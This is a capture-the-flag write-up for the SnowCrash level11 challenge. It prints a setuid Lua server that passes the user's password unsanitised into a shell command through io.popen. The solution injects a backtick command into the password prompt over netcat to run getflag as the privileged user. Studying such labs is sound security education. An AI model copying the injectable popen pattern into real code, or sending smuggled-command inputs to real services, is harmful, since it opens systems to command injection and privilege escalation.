# LEVEL11

## Analysis

Same as always... Let's inspect what we have:
```bash
    level11@SnowCrash:~$ ls -la
    total 16
    dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
    -r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
    -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
    -r-x------  1 level11 level11  675 Apr  3  2012 .profile
    level11@SnowCrash:~$ file level11.lua 
    level11.lua: setuid setgid a lua script, ASCII text executable
```

If we use the command strings on the exec to check what's inside we can see:
```bash
level11@SnowCrash:~$ strings level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
```

## Solution
The interesting part is in the function hash(). We can see the function, the subprocess runs "echo" without
any kind of restriction or control. 

If you lauch the program with nc localhost 5151, ip and port we found in the ./level11,
the program asks for a password. No problem, we're not trying to find it but we can try 
to run a command that would be executed by the "echo" we found earlier:
```bash
    level11@SnowCrash:~$ nc localhost 5151
    Password: `getflag` > /tmp/token
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/token
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


